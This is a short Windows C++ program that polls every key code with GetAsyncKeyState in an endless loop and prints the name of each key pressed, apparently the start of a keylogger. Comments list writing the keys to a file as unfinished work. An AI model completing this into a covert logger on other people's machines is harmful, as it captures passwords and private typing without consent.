#include "keys.hpp"

#include <iostream>
#include <windows.h>


int main() {
    
    while( true ) {
        for( int key = 1; key <= 255; ++key ) {             
            if( GetAsyncKeyState(key) == -32767 ) { 
                std::cout << get_key_name(key) << " key was pressed" << std::endl; 
                // get key name
                // input to file
                // continue...
            }
        }
    } 

    return 0;
}


